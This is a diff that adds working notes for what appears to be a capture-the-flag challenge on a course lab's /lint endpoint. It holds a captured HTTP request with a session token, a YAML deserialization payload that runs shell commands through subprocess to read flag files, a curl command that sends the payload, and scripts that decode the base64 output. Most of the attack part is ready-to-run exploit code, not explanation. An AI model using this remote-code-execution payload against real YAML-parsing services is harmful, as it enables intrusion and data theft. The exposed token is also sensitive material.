@@ -1,0 +1,67 @@
+POST /lint HTTP/2
+Host: 5b7c7c0f.proxy.coursestack.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+Referer: https://5b7c7c0f.proxy.coursestack.com/
+Content-Type: application/json
+Content-Length: 214
+Origin: https://5b7c7c0f.proxy.coursestack.com
+Connection: keep-alive
+Cookie: _ga_6F3S5QGGQM=GS2.1.s1759355414$o1$g1$t1759355432$j42$l0$h0; _ga=GA1.1.79848348.1759355415; token=5b7c7c0f-bbbc-462e-8daf-199fb4f314a5_1_ee86666f4562af8496367e9779fa10bcc4585ba93f3487efed1048a85bf7a8bc
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+Pragma: no-cache
+Cache-Control: no-cache
+TE: trailers
+
+payload would be:
+user_input: !!python/object/apply:subprocess.check_output ['cat /app/flag.txt']
+
+# build payload that uses base64 (avoids kwargs trouble)
+cat > payload_exploit.json <<'JSON'
+{
+  "yaml_content": "title: !!python/object/apply:subprocess.check_output\n  - [\"bash\",\"-lc\",\"base64 /flag || base64 /flag.txt || base64 /app/flag || base64 /app/flag.txt || true\"]\nlogsource: {category: process_creation}\ndetection:\n  sel: {Image|endswith: foo}\ncondition: sel\n",
+  "method": "s2"
+}
+JSON
+
+# set your token variable (you already have this)
+TOKEN='5b7c7c0f-bbbc-462e-8daf-199fb4f314a5_1_ee86666f4562af8496367e9779fa10bcc4585ba93f3487efed1048a85bf7a8bc'
+
+# post payload and save full response
+curl -i -s -k 'https://ae0bbe8c.proxy.coursestack.com/lint' \
+  -H 'Content-Type: application/json' \
+  -H "Cookie: token=${TOKEN}" \
+  --data-binary @payload_exploit.json > resp_raw.txt
+
+# show response header+body preview
+sed -n '1,200p' resp_raw.txt
+
+# try to extract the first large base64 blob and decode it to flag.txt
+grep -oE '([A-Za-z0-9+/]{40,}={0,2})' resp_raw.txt | head -n1 | tr -d '\n' > maybe_b64.txt
+if [[ -s maybe_b64.txt ]]; then
+  cat maybe_b64.txt | base64 -d > flag.txt 2>/dev/null && echo "Decoded -> flag.txt:" && sed -n '1,200p' flag.txt || echo "Found base64-like blob but decode failed"
+else
+  echo "No large base64 block found in response. Paste resp_raw.txt here and I'll parse it."
+fi
+
+then decode base64 output
+python3 - <<'PY'
+import re
+s=open('resp_raw.txt','r',errors='ignore').read()
+m=re.search(r"b'([^']+)'", s)
+if m:
+  import base64,sys
+  b64=m.group(1)
+  try:
+    open('flag.txt','wb').write(base64.b64decode(b64))
+    print(open('flag.txt','rb').read(200).decode('utf-8','replace'))
+  except Exception as e:
+    print("decode failed:", e)
+else:
+  print("no python bytes-literal found")
+PY
